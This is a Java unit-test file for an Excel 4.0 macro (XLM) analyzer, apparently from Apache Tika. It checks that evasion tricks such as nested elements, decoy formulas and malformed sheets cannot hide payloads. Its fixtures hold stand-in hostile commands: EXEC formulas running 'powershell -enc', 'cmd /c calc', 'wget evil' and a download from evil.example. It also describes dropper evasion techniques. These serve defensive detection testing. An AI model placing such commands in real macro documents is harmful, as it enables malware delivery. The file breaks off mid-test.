/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.apache.tika.parser.microsoft.ooxml;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

import org.apache.poi.openxml4j.opc.OPCPackage;
import org.apache.poi.openxml4j.opc.PackagePart;
import org.apache.poi.openxml4j.opc.PackagingURIHelper;
import org.apache.poi.xssf.usermodel.XSSFRelation;
import org.junit.jupiter.api.Test;

import org.apache.tika.metadata.Metadata;
import org.apache.tika.metadata.TikaCoreProperties;
import org.apache.tika.parser.ParseContext;
import org.apache.tika.sax.ToXMLContentHandler;
import org.apache.tika.sax.XHTMLContentHandler;

/**
 * THREE total-loss evasions on the XLM capture path, each reachable by a one-element or
 * one-byte edit to the document, each of which reported success while dropping the payload.
 *
 * <p>These are not budget shortfalls. In every case the capture ran to completion, set no
 * flag, and produced output that reads as a clean parse -- which is strictly worse for
 * triage than reporting nothing, because "no macro IOCs" is an actionable verdict and here
 * it was a false one. Each test asserts BOTH that the payload now survives AND that the
 * specific broken output is gone; asserting only the former is how three earlier fixes in
 * this area shipped half-done.
 */
class XlmEvasionResilienceTest {

    private static final String PAYLOAD = "powershell -enc AAAA";

    // ── 1. A child element inside <f> replaced the whole formula ─────────────

    /**
     * {@code <f>} and {@code <v>} are SIBLINGS inside {@code <c>} in SpreadsheetML; they are
     * never nested. The handler shares one {@code buf} across both and cleared it on every
     * start tag, so the inner {@code <v>} wiped the formula that had already been read and
     * {@code </f>} then published the INNER element's text as the formula.
     *
     * <p>Result before this fix: formula {@code "0"}, {@code isTruncated()} false, IOCs
     * empty. A live dropper triaged as a clean macro-bearing workbook.
     */
    @Test
    void testNestedValueElementCannotEraseTheFormula() throws Exception {
        XlmXmlMacrosheetParser parser = parseCellXml(
                "<f>=EXEC(\"" + PAYLOAD + "\")<v>0</v></f>");

        String formula = onlyFormula(parser);
        assertTrue(formula.contains("EXEC") && formula.contains(PAYLOAD),
                "the formula must survive a nested <v>; got: " + formula);
        assertFalse("0".equals(formula),
                "REGRESSION GUARD: the inner <v> text must not become the formula -- that "
                        + "was the whole defect, and a test that only checks EXEC is present "
                        + "would still pass if the two were concatenated wrongly");
        assertEquals("=EXEC(\"" + PAYLOAD + "\")", formula,
                "the suppressed <v> must leave NO trace -- neither replacing the formula nor "
                        + "concatenated into it. Exact match is the assertion with teeth: a "
                        + "contains() check also passes on \"=EXEC(...)0\", which is wrong too.");
        assertTrue(parser.hasStructuralAnomaly(),
                "nested <f>/<v> is not something Excel emits, so it must be reported as an "
                        + "anomaly even though the content was preserved");
    }

    /** Same defect via {@code <t>}, the other element sharing {@code buf}. */
    @Test
    void testNestedTextElementCannotEraseTheFormula() throws Exception {
        XlmXmlMacrosheetParser parser = parseCellXml(
                "<f>=EXEC(\"" + PAYLOAD + "\")<is><t>decoy</t></is></f>");

        String formula = onlyFormula(parser);
        assertTrue(formula.contains(PAYLOAD), "got: " + formula);
        assertFalse(formula.contains("decoy"),
                "the suppressed nested element's text must not contaminate the formula");
        assertTrue(parser.hasStructuralAnomaly());
    }

    /**
     * A SECOND {@code <f>} in one {@code <c>} used to win outright (last-wins), so a dropper
     * could hide the payload behind a benign decoy. Both must survive, in either order,
     * because we cannot know which one Excel would honour.
     */
    @Test
    void testDuplicateFormulaElementKeepsBothNotJustTheLast() throws Exception {
        XlmXmlMacrosheetParser decoyFirst = parseCellXml(
                "<f>=1+1</f><f>=EXEC(\"" + PAYLOAD + "\")</f>");
        assertTrue(onlyFormula(decoyFirst).contains(PAYLOAD),
                "payload-last must survive: " + onlyFormula(decoyFirst));
        assertTrue(onlyFormula(decoyFirst).contains("1+1"),
                "the first <f> must not be discarded either: " + onlyFormula(decoyFirst));

        XlmXmlMacrosheetParser payloadFirst = parseCellXml(
                "<f>=EXEC(\"" + PAYLOAD + "\")</f><f>=1+1</f>");
        assertTrue(onlyFormula(payloadFirst).contains(PAYLOAD),
                "payload-first must survive last-wins overwrite: "
                        + onlyFormula(payloadFirst));
        assertTrue(payloadFirst.hasStructuralAnomaly());
    }

    /** A legitimate single formula must NOT be flagged as anomalous. */
    @Test
    void testWellFormedCellIsNotFlaggedAsAnomalous() throws Exception {
        XlmXmlMacrosheetParser parser = parseCellXml(
                "<f>=EXEC(\"" + PAYLOAD + "\")</f><v>0</v>");
        assertTrue(onlyFormula(parser).contains(PAYLOAD));
        assertFalse(parser.hasStructuralAnomaly(),
                "sibling <f> then <v> is the NORMAL shape -- flagging it would make the "
                        + "anomaly signal worthless");
    }

    /** Rich-text inline strings legitimately repeat sibling {@code <t>} runs. */
    @Test
    void testRichTextInlineStringStillConcatenatesAndIsNotFlagged() throws Exception {
        XlmXmlMacrosheetParser parser = parseCellXml(
                "<is><r><t>http://evil.example/</t></r><r><t>a.exe</t></r></is>", "inlineStr");
        String value = parser.getValues().values().stream().findFirst().orElse("");
        assertTrue(value.contains("http://evil.example/a.exe"),
                "split-payload inline runs must still concatenate; got: " + value);
        assertFalse(parser.hasStructuralAnomaly(),
                "multiple sibling <t> inside one <is> is normal rich text");
    }

    /**
     * The anomaly must reach METADATA, not just the parser's boolean.
     *
     * <p>Every other anomaly test above asserts {@code parser.hasStructuralAnomaly()} -- the
     * mechanism. None exercised the parser -> decorator -> metadata wiring, so a missing
     * {@code markXlmStructuralAnomaly} call or a misspelled key would have left the whole suite
     * green while the signal reached no consumer. Metadata is where every other capture signal
     * is read, so an unwired flag is a no-op fix.
     */
    @Test
    void testStructuralAnomalyReachesMetadataWithoutClaimingTruncation() throws Exception {
        Metadata metadata = new Metadata();
        processMacroSheets(metadata, new String[] {"aa-nested"},
                new String[] {cellXmlDoc("<f>=EXEC(\"" + PAYLOAD + "\")<v>0</v></f>", null)});

        assertTrue(Boolean.parseBoolean(metadata.get("msoffice:xlm-structural-anomaly")),
                "the anomaly must be published as metadata; got: "
                        + metadata.get("msoffice:xlm-structural-anomaly"));
        // The design claim, asserted rather than merely commented: this is an evasion TELL, not
        // a capture shortfall. Setting the truncation signals would inflate the flag that drives
        // re-analysis, and would wrongly say evidence was withheld when none was.
        assertNull(metadata.get(TikaCoreProperties.TRUNCATED_METADATA),
                "nothing was withheld, so TRUNCATED_METADATA must stay unset");
        assertFalse(Boolean.parseBoolean(
                        metadata.get("msoffice:xlm-capture-limit-reached")),
                "capture completed in full, so the capture-limit flag must stay unset");
    }

    // ── 2. One malformed macrosheet erased the whole workbook's results ──────

    /**
     * A macrosheet truncated mid-tag threw {@code SAXParseException}, which the loop
     * rethrew, aborting the extractor before the CROSS-SHEET IOC scan, embedded-part
     * extraction, and {@code endDocument()}. So one broken part -- trivially
     * attacker-supplied -- suppressed XLM analysis for every OTHER sheet in the workbook,
     * with no flag whatsoever.
     *
     * <p>The broken part is named to sort FIRST, so this also proves the loop CONTINUES
     * rather than merely salvaging results gathered before the failure.
     */
    @Test
    void testOneMalformedMacrosheetDoesNotEraseTheOtherSheetsIocs() throws Exception {
        Metadata metadata = new Metadata();
        String out = processMacroSheets(metadata,
                new String[] {"aa-broken", "bb-payload"},
                new String[] {
                    // truncated mid-tag: no closing </c></row></sheetData></worksheet>
                    "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/"
                            + "2006/main\"><sheetData><row r=\"1\"><c r=\"A1\"><f>=EXEC(",
                    cellXmlDoc("<f>=EXEC(\"" + PAYLOAD + "\")</f>", null),
                });

        assertTrue(out.contains("EXEC: " + PAYLOAD),
                "the surviving sheet's EXEC IOC must still be scanned and emitted after an "
                        + "earlier part failed to parse. Output was:\n" + out);
        assertTrue(out.contains("xlm-parse-error"),
                "the failed part must be reported in the output, not swallowed");
        assertTrue(Boolean.parseBoolean(
                        metadata.get("msoffice:xlm-capture-limit-reached")),
                "a part we could not parse means analysis was incomplete -- that must be "
                        + "flagged, because a silent empty result reads as a clean parse");
        assertNotNull(metadata.get(TikaCoreProperties.TRUNCATED_METADATA));
    }

    /** A clean two-part workbook must not acquire either signal. */
    @Test
    void testTwoWellFormedMacrosheetsSetNoFailureSignal() throws Exception {
        Metadata metadata = new Metadata();
        String out = processMacroSheets(metadata,
                new String[] {"aa-one", "bb-two"},
                new String[] {
                    cellXmlDoc("<f>=EXEC(\"" + PAYLOAD + "\")</f>", null),
                    cellXmlDoc("<f>=1+1</f>", null),
                });
        assertTrue(out.contains("EXEC: " + PAYLOAD));
        assertFalse(out.contains("xlm-parse-error"), out);
        assertFalse(Boolean.parseBoolean(
                        metadata.get("msoffice:xlm-capture-limit-reached")),
                "clean input must not trip the incomplete-analysis flag");
    }

    // ── 3. XLSB: one unknown Ptg byte stripped the function call ─────────────

    /**
     * The decoder knows roughly 40 of ~200 Ptg opcodes. An unknown opcode has an unknown
     * OPERAND LENGTH, so the byte cursor desynchronizes and every later token is decoded
     * from misaligned bytes. Splicing one such byte into an EXEC formula turned
     * {@code =EXEC("powershell -enc AAAA")} into {@code ="powershell -enc AAAA"} -- the call
     * gone, the result emitted as a COMPLETE formula, no marker, no flag. Reported as inert
     * data instead of execution.
     */
    @Test
    void testUnknownPtgYieldsAMarkerNotASilentlyCompleteFormula() {
        byte[] spliced = execFormulaWithUnknownPtgSpliced(PAYLOAD);

        boolean[] incomplete = new boolean[1];
        String text = Biff12XlmFormulaDecoder.decode(spliced, incomplete);

        assertTrue(incomplete[0],
                "an undecodable Ptg stream must be reported to the caller");
        assertNotNull(text, "an undecodable stream should still yield the decoded prefix");
        assertTrue(text.contains(Biff12XlmFormulaDecoder.XLSB_UNDECODED_PTG_MARKER),
                "the emitted text must carry the incomplete-decode marker; got: " + text);
        assertFalse(text.equals("\"" + PAYLOAD + "\""),
                "REGRESSION GUARD: the exact broken output was a bare quoted string that "
                        + "reads as inert data. Asserting only that a marker exists would "
                        + "not catch a reintroduction that emitted the marker elsewhere.");
    }

    /**
     * ONE undecodable formula must not suppress every LATER cell's IOCs.
     *
     * <p>The first version of the unknown-Ptg fix reported the condition via
     * {@code ctx.markLimit()}. {@code EvalContext.isLimitReached()} is
     * {@code limitWarning != null}, and {@code XlmMacroEmulator.stopOnContextLimit} turns that
     * into {@code emulationAborted}, so one spliced junk byte took a macrosheet from three EXEC
     * indicators to ZERO -- a worse total-loss evasion than the one being fixed, and the same
     * one-part kill switch removed from the XML path in the same commit. A budget being spent
     * means "stop"; one bad formula means "this cell is untrustworthy". Different signals.
     *
     * <p>The corpus could not catch this: no sample in 3,084 documents hits an unknown Ptg.
     */
    @Test
    void testOneUndecodableFormulaDoesNotSuppressLaterCellsIocs() {
        XlmMacroEmulator emulator = new XlmMacroEmulator(
                new HashMap<>(), XlmWorkbookSheetMap.empty(), XlmMacroEmulator.Limits.DEFAULT);
        // Cell 0 is a single unhandled opcode; cells 1-3 are ordinary EXEC formulas.
        emulator.addMacroCell(0, new byte[] {(byte) 0x30});
        emulator.addMacroCell(1, execFormula("powershell -enc AAAA"));
        emulator.addMacroCell(2, execFormula("cmd /c calc"));
        emulator.addMacroCell(3, execFormula("wget evil"));

        emulator.emulate();
        List<String> iocs = emulator.iocs;
        long execs = iocs.stream().filter(s -> s.startsWith("EXEC:")).count();
        assertEquals(3, execs,
                "all three EXEC command lines must survive a junk byte in an EARLIER cell; "
                        + "got " + iocs);
        assertTrue(emulator.isLimitReached(),
                "the undecodable cell must still be REPORTED -- not aborting is not the same "
                        + "as staying silent");
    }

    /** A well-formed EXEC must decode with no marker and no signal. */
    @Test
    void testWellFormedExecFormulaIsNotMarked() {
        boolean[] incomplete = new boolean[1];
        String text = Biff12XlmFormulaDecoder.decode(execFormula(PAYLOAD), incomplete);

        assertNotNull(text);
        assertTrue(text.contains("EXEC"), "got: " + text);
        assertFalse(incomplete[0],
                "a fully decodable formula must not be reported as incomplete");
        assertFalse(text.contains(Biff12XlmFormulaDecoder.XLSB_UNDECODED_PTG_MARKER),
                "marking a clean formula would make the marker worthless; got: " + text);
    }

    // ── 4. Extraction was not reproducible ──────────────────────────────────

    /**
     * Emulated {@code NOW()}/{@code TODAY()} read the WALL CLOCK, so the parse timestamp
     * landed in the extracted TEXT (a {@code REGISTER: 46244.7446875} line). Two runs of the
     * same binary over the same 1,123-document XLSB corpus disagreed on 47 documents.
     *
     * <p>That breaks anything keyed on extracted text -- dedup, caches, and A/B comparisons
     * between builds, which is how this was found: a corpus diff attributed 47 "regressions"
     * to a change that had not caused them. The differing value carries no analyst signal;
     * the {@code TIME_GATE} IOC is the actionable part and still fires.
     */
    @Test
    void testNowIsDeterministicSoExtractionIsReproducible() {
        Object first = evalNow();
        assertTrue(first instanceof Double && (Double) first > 0,
                "still a usable serial, so time-gate comparisons resolve; got: " + first);

        // Repeated-call equality is NOT sufficient and must not be relied on: the old
        // wall-clock path had toSecondOfDay() resolution, so calls within the same second
        // returned an identical double and that assertion passed AGAINST the bug. Verified by
        // mutation -- restoring the wall clock left the whole suite green.
        // The assertion with teeth is that the value is nowhere near TODAY's serial, which a
        // wall-clock read can never satisfy.
        long todaySerial = java.time.temporal.ChronoUnit.DAYS.between(
                java.time.LocalDate.of(1899, 12, 30),
                java.time.LocalDate.now(java.time.ZoneOffset.UTC));
        assertTrue(Math.abs((Double) first - todaySerial) > 1000,
                "NOW() returned " + first + ", within 1000 days of today's serial "
                        + todaySerial + " -- that is the wall clock, which puts the parse "
                        + "timestamp into extracted text and makes output irreproducible.");

        for (int i = 0; i < 5; i++) {
            assertEquals(first, evalNow(), "NOW() must fold to a FIXED serial");
        }
    }

    /** The time-gate IOC must survive the determinism fix -- that is the analyst signal. */
    @Test
    void testTimeGateIocStillFires() {
        Biff12XlmFormulaDecoder.EvalContext ctx = newCtx();
        Biff12XlmFormulaDecoder.evaluateFormula(nowFormula(), ctx);
        assertTrue(ctx.iocs.stream().anyMatch(s -> s.contains("TIME_GATE")),
                "the time-gate tell must still be reported; got: " + ctx.iocs);
    }

    /**
     * A far-future clock is the conservative pick: droppers gate on
     * {@code NOW() > <past date>} to stop detonating after a campaign window, so the fixed
     * clock must take the same branch the wall clock did.
     */
    @Test
    void testFixedClockIsLateEnoughToPassRealisticTimeGates() {
        // Excel serial for 2030-01-01 is ~47484; anything a live dropper compares against is
        // far earlier. The fixed clock must exceed it, or emulation loses reach.
        assertTrue(Biff12XlmFormulaDecoder.EMULATION_CLOCK_SERIAL > 47484,
                "clock serial " + Biff12XlmFormulaDecoder.EMULATION_CLOCK_SERIAL
                        + " would make NOW()>past-date gates evaluate FALSE, silently "
                        + "shrinking emulation coverage");
    }

    // ── 5. A 22-byte record could allocate 514 MiB ───────────────────────────

    /**
     * The formula-size field was validated against the operator-settable knob, not against the
     * bytes actually present, so a tiny record declaring a huge size allocated that much before
     * {@code readBytes} noticed the shortfall and discarded the formula anyway.
     */
    @Test
    void testOversizedLengthFieldDoesNotAllocateBeyondTheRecord() throws Exception {
        // 22-byte header, formula-size field claims 512 MiB, zero formula bytes follow.
        byte[] record = ByteBuffer.allocate(22).order(ByteOrder.LITTLE_ENDIAN)
                .putInt(0).putInt(0).putDouble(0).putShort((short) 0)
                .putInt(512 * 1024 * 1024).array();

        int[] dropped = new int[1];
        long before = usedHeap();
        Biff12XlmMacrosheetParser parser = new Biff12XlmMacrosheetParser(
                new ByteArrayInputStream(new byte[0]),
                new XHTMLContentHandler(new ToXMLContentHandler(), new Metadata(),
                        new ParseContext()),
                null, Integer.MAX_VALUE, () -> dropped[0]++);
        parser.handleRecord(0x0009, record);
        long grew = usedHeap() - before;

        assertEquals(1, dropped[0],
                "dropping a formula must be reported, not silent");
        assertTrue(grew < 64L * 1024 * 1024,
                "a 22-byte record must not allocate hundreds of MiB; heap grew " + grew
                        + " bytes. maxFormulaRecordBytes is operator-settable to "
                        + "Integer.MAX_VALUE, so the knob cannot be the only ceiling.");
    }

    // ── 6. Raising the formula cap silently narrowed IOC scanning ────────────

    /**
     * The IOC scanner's per-formula ceiling was a hardcoded 64 KB, decoupled from the
     * operator-settable capture cap. At the 16 KB default capture cap it is unreachable, which
     * is why it looked harmless -- but an operator raising the capture cap to catch bigger
     * payloads still had only the first 64 KB SCANNED, silently. The knob whose purpose is
     * "see more" made detection strictly worse for exactly the payloads that motivated it.
     */
    @Test
    void testScanCeilingTracksCaptureCapAndReportsTruncation() {
        int scanCap = XlmXmlIocScanner.MAX_FORMULA_SCAN_LEN;
        // Payload past the DEFAULT scan ceiling; recoverable only if the ceiling was raised.
        String formula = "=" + "A".repeat(scanCap + 64) + "&EXEC(\"" + PAYLOAD + "\")";
        Map<String, String> formulas = Map.of("Macro1:1:1", formula);

        int[] truncations = new int[1];
        List<String> atDefault = XlmXmlIocScanner.scan(
                formulas, Map.of(), scanCap, () -> truncations[0]++);
        assertEquals(1, truncations[0],
                "cutting the scan input must be REPORTED -- IOCs in the tail are simply "
                        + "absent from the IOC list, invisible to every consumer of it");
        assertTrue(atDefault.stream().noneMatch(s -> s.contains(PAYLOAD)),
                "control: at the default ceiling the tail payload is genuinely missed, so "
                        + "this fixture actually exercises the cap rather than passing "
                        + "vacuously");

        int[] noTruncation = new int[1];
        List<String> raised = XlmXmlIocScanner.scan(
                formulas, Map.of(), formula.length(), () -> noTruncation[0]++);
        assertEquals(0, noTruncation[0], "nothing was cut, so nothing should be reported");
        assertTrue(raised.stream().anyMatch(s -> s.contains(PAYLOAD)),
                "with the ceiling raised to the capture cap the payload must be found; got: "
                        + raised);
    }

    // ── 7. Holes review found in the FIRST version of these fixes ────────────

    /**
     * A {@code <t>} directly inside {@code <f>} -- NOT inside an {@code <is>} -- used to skip
     * the suppression guard entirely, because suppression was keyed on the element NAME plus
     * {@code inInlineString}. Its text was appended to the formula and no anomaly was flagged,
     * producing exactly the {@code =EXEC(...)DECOY} concatenation the first test calls wrong.
     */
    @Test
    void testNonInlineTextElementInsideFormulaIsSuppressedAndFlagged() throws Exception {
        XlmXmlMacrosheetParser parser = parseCellXml(
                "<f>=EXEC(\"" + PAYLOAD + "\")<t>DECOY</t></f>");

        assertEquals("=EXEC(\"" + PAYLOAD + "\")", onlyFormula(parser),
                "a <t> child of <f> must be suppressed like any other nested element");
        assertTrue(parser.hasStructuralAnomaly(),
                "and it must still be reported as an anomaly");
    }

    /**
     * {@code endElement} decremented {@code suppressDepth} for any {@code f}/{@code v}/{@code t}
     * close while {@code startElement} only incremented for some, so a {@code <t/>} inside a
     * suppressed {@code <v>} LIFTED that suppression and the rest of the {@code <v>}
     * contaminated the formula. Increment and decrement must be symmetric.
     */
    @Test
    void testSuppressionCannotBeLiftedByAnUnmatchedCloseTag() throws Exception {
        XlmXmlMacrosheetParser parser = parseCellXml(
                "<f>=EXEC(\"" + PAYLOAD + "\")<v><t/>DECOY2</v></f>");

        assertEquals("=EXEC(\"" + PAYLOAD + "\")", onlyFormula(parser),
                "text after an unmatched </t> inside a suppressed <v> must stay suppressed");
        assertTrue(parser.hasStructuralAnomaly());
    }

    /**
     * A foreign-namespace child must be suppressed (its characters would otherwise land in the
     * formula) AND must not leak suppression depth. The namespace filter in {@code endElement}
     * runs AFTER the decrement precisely so the depth comes back down; otherwise every later
     * element on the sheet would be silently swallowed.
     */
    @Test
    void testForeignNamespaceChildIsSuppressedWithoutLeakingDepth() throws Exception {
        String xml = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/"
                + "main\" xmlns:x=\"urn:example:other\"><sheetData>"
                + "<row r=\"1\"><c r=\"A1\"><f>=EXEC(\"" + PAYLOAD + "\")"
                + "<x:junk>DECOY3</x:junk></f></c>"
                + "<c r=\"B1\"><f>=EXEC(\"second-cell\")</f></c></row>"
                + "</sheetData></worksheet>";
        Metadata metadata = new Metadata();
        XHTMLContentHandler xhtml = new XHTMLContentHandler(
                new ToXMLContentHandler(), metadata, new ParseContext());
        XlmXmlMacrosheetParser parser = new XlmXmlMacrosheetParser(
                new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)),
                xhtml, "Macro1", null);
        xhtml.startDocument();
        parser.parse();
        xhtml.endDocument();

        // Assert the payload is PRESENT, not merely that the decoy is absent. Asserting only
        // absence was vacuous: with the depth leaked, </f> is consumed as a suppressed close so
        // the cell flushes empty, and "does not contain DECOY3" passes on a formula that was
        // lost entirely. Verified by mutation -- moving the namespace filter back above the
        // decrement left this test green until this assertion was added.
        assertEquals("=EXEC(\"" + PAYLOAD + "\")", onlyFormula(parser),
                "the payload must survive a foreign-namespace child, uncontaminated; got: "
                        + parser.getFormulaList());
        assertTrue(parser.getFormulaList().stream().anyMatch(f -> f.contains("second-cell")),
                "and the NEXT cell must still be captured -- if suppressDepth leaked, "
                        + "everything after the foreign element would be swallowed. Got: "
                        + parser.getFormulaList());
        assertEquals(2, parser.getFormulas().size(),
                "both cells must be recorded; got: " + parser.getFormulas());
    }

    /**
     * A part that is not XML at all must be flagged, and the other sheet must survive it.
     *
     * <p>SCOPE NOTE, so this is not mistaken for more than it is: the report is now gated on a
     * {@code parseFailed} BOOLEAN rather than on {@code parseError != null}, because an
     * exception with a null {@code getMessage()} previously produced no text note and no
     * metadata flag. That null-message path is defensive and is NOT covered here -- every
     * exception this fixture can provoke through the real SAX layer carries a message, and
     * mutation confirmed it: reverting the gate to {@code parseError != null} leaves this test
     * green. The boolean is kept because it cannot be worse, not because a test proves it.
     */
    @Test
    void testUnparseablePartIsFlaggedAndTheOtherSheetSurvives() throws Exception {
        Metadata metadata = new Metadata();
        String out = processMacroSheets(metadata, new String[] {"aa-broken", "bb-payload"},
                new String[] {
                    "   not xml at all",
                    cellXmlDoc("<f>=EXEC(\"" + PAYLOAD + "\")</f>", null),
                });

        assertTrue(out.contains("xlm-parse-error"),
                "the failed part must be reported in the output. Got:\n" + out);
        assertTrue(Boolean.parseBoolean(
                        metadata.get("msoffice:xlm-capture-limit-reached")),
                "and flagged in metadata regardless of whether the exception had a message");
        assertTrue(out.contains("EXEC: " + PAYLOAD),
                "the surviving sheet's IOC must still be scanned");
    }

    /**
     * A replacement that FITS must be admitted. The charge was made net but the admission gate
     * stayed gross, so a replacement was tested against a total that already counted the entry
     * it replaces -- the same double-count, moved from the accumulator into the gate.
     *
     * <p>Reachable on purpose: a benign short decoy at a cell ref, then the payload at the SAME
     * ref once the budget is nearly spent, and the payload is the one dropped.
     */
    @Test
    void testReplacementThatFitsIsAdmittedNotRejectedAgainstItsOwnOldLength() throws Exception {
        String decoy = "=" + "D".repeat(300);
        String payload = "=EXEC(\"" + PAYLOAD + "\")";
        // Aggregate budget 310: the 301-char decoy fits, and the 29-char payload fits on NET
        // accounting (0 + 29) but not on GROSS (301 + 29 = 330 > 310). The window matters --
        // a looser cap leaves both accountings passing and the test proves nothing, which is
        // exactly what a first version of this test did.
        String xml = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/"
                + "main\"><sheetData><row r=\"1\">"
                + "<c r=\"A1\"><f>" + decoy + "</f></c>"
                + "<c r=\"A1\"><f>" + payload + "</f></c>"
                + "</row></sheetData></worksheet>";
        Metadata metadata = new Metadata();
        XHTMLContentHandler xhtml = new XHTMLContentHandler(
                new ToXMLContentHandler(), metadata, new ParseContext());
        XlmXmlMacrosheetParser parser = new XlmXmlMacrosheetParser(
                new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)),
                xhtml, "Macro1", null, 4096, 4096, 4096, 4096, 340);
        xhtml.startDocument();
        parser.parse();
        xhtml.endDocument();

        // Both are kept (see testDuplicateCellRefKeepsBothAndIsFlagged): a duplicated ref is
        // malformed and we cannot know which one Excel honours, so neither may be discarded.
        String kept = onlyFormula(parser);
        assertTrue(kept.contains(PAYLOAD),
                "the payload must survive a decoy at the same cell ref; got: " + kept);
        assertTrue(kept.contains("DDD"), "and the decoy is kept too; got: " + kept);
        assertFalse(parser.isTruncated(),
                "the combined text fit the aggregate cap, so no truncation may be reported -- "
                        + "reporting one here fabricates an evidence loss");
        assertEquals(kept.length(), parser.getRetainedFormulaChars(),
                "THE INVARIANT: the budget charge must equal exactly what is stored. This is "
                        + "what catches both gross charging (billing per overwrite) and under-"
                        + "charging (storing more than was billed).");
    }

    // ── 8. A repeated cell ref burned budget it never retained ───────────────

    /**
     * {@code formulas} is keyed by cell ref, so a repeated ref REPLACES the prior entry -- but
     * the document-wide budget was charged the full length every time. A sheet repeating one
     * cell ref therefore drained the budget with content that was never retained, cutting
     * capture short for LATER sheets that did carry payload.
     */
    @Test
    void testRepeatedCellRefDoesNotDoubleChargeTheBudget() throws Exception {
        String cell = "<c r=\"A1\"><f>=" + "C".repeat(400) + "</f></c>";
        String rows = "<row r=\"1\">" + cell.repeat(20) + "</row>";
        String xml = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/"
                + "2006/main\"><sheetData>" + rows + "</sheetData></worksheet>";

        Metadata metadata = new Metadata();
        XHTMLContentHandler xhtml = new XHTMLContentHandler(
                new ToXMLContentHandler(), metadata, new ParseContext());
        // Aggregate budget of 2000 chars: one 401-char formula fits many times over, but 20
        // full charges (8020) would blow it and trip the truncation flag.
        XlmXmlMacrosheetParser parser = new XlmXmlMacrosheetParser(
                new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)),
                xhtml, "Macro1", null, 4096, 4096, 4096, 4096, 2000);
        xhtml.startDocument();
        parser.parse();
        xhtml.endDocument();

        assertEquals(1, parser.getFormulas().size(),
                "one cell ref stays ONE map entry, however many times it is repeated");
        // Repetitions are CONCATENATED rather than dropped, so the charge grows with what is
        // actually stored -- and that is the invariant worth pinning. The earlier version of
        // this test asserted a fixed ceiling (~500), which encoded the old replace-and-discard
        // behaviour and would have to be edited every time the retention policy changed.
        int stored = onlyFormula(parser).length();
        assertEquals(stored, parser.getRetainedFormulaChars(),
                "THE INVARIANT: charged must equal stored. Gross charging billed 20x for one "
                        + "retained copy; charged " + parser.getRetainedFormulaChars()
                        + " for " + stored + " stored chars");
        assertTrue(parser.getRetainedFormulaChars() <= 2000,
                "and the aggregate cap still bounds the total; charged "
                        + parser.getRetainedFormulaChars());
    }

    // ── 9. Residuals from the review, now fixed ──────────────────────────────

    /**
     * The XML IOC scan had NO output bound: the {@code xlmMaxIocEntries}/{@code xlmMaxIocChars}
     * knobs were honoured only by the XLSB emulator. {@code EXEC(cellref)} resolution amplifies a
     * short formula into a value-length indicator, so a workbook whose RETENTION stays inside
     * every documented cap could still build gigabytes of IOC strings and OOM a triage worker.
     * Bounding retention could never fix it -- the amplification happens after retention.
     */
    @Test
    void testIocOutputIsBoundedAndTheBoundIsReported() {
        // 400 formulas each resolving EXEC(A1) against a 1 KB cell value: ~400 KB of output from
        // a few KB of input, before any per-entry cap applies.
        Map<String, String> formulas = new java.util.LinkedHashMap<>();
        for (int i = 1; i <= 400; i++) {
            formulas.put("Macro1:" + i + ":A" + i, "=EXEC(A1)");
        }
        Map<String, String> values = Map.of("Sheet1:1:A1", "X".repeat(1024));

        int[] limited = new int[1];
        List<String> bounded = XlmXmlIocScanner.scan(formulas, values,
                XlmXmlIocScanner.MAX_FORMULA_SCAN_LEN, null, 50, 8192, () -> limited[0]++);

        assertEquals(1, limited[0], "dropping indicators for want of budget must be REPORTED");
        assertTrue(bounded.size() <= 50, "entry bound must hold; got " + bounded.size());
        int chars = bounded.stream().mapToInt(String::length).sum();
        assertTrue(chars <= 8192, "char bound must hold; got " + chars);
        assertTrue(bounded.stream().anyMatch(s -> s.startsWith("EXEC:")),
                "the bound must not empty the list -- indicators up to the cap still ship");

        // Control: a generous bound must not report a limit, and must not silently drop.
        int[] unlimited = new int[1];
        List<String> full = XlmXmlIocScanner.scan(formulas, values,
                XlmXmlIocScanner.MAX_FORMULA_SCAN_LEN, null, 0, 0, () -> unlimited[0]++);
        assertEquals(0, unlimited[0], "a default bound this input fits must not report a limit");
        assertTrue(full.size() > 50,
                "control: with the default bound the same input yields more than the tight cap, "
                        + "so the tight case above genuinely exercised the bound");
    }

    /**
     * A duplicated {@code <c r="...">} used to let a benign decoy DELETE the payload from
     * {@code formulas} -- the same last-wins evasion fixed one level down for a duplicated
     * {@code <f>}, left live at the cell level. {@code formulas} feeds the IOC scanner and the
     * MACRO entry, so the payload vanished from every structured output with no flag.
     */
    @Test
    void testDuplicateCellRefKeepsBothAndIsFlagged() throws Exception {
        String xml = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/"
                + "main\"><sheetData><row r=\"1\">"
                + "<c r=\"A1\"><f>=EXEC(\"" + PAYLOAD + "\")</f></c>"
                + "<c r=\"A1\"><f>=1+1</f></c>"
                + "</row></sheetData></worksheet>";
        Metadata metadata = new Metadata();
        XHTMLContentHandler xhtml = new XHTMLContentHandler(
                new ToXMLContentHandler(), metadata, new ParseContext());
        XlmXmlMacrosheetParser parser = new XlmXmlMacrosheetParser(
                new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)),
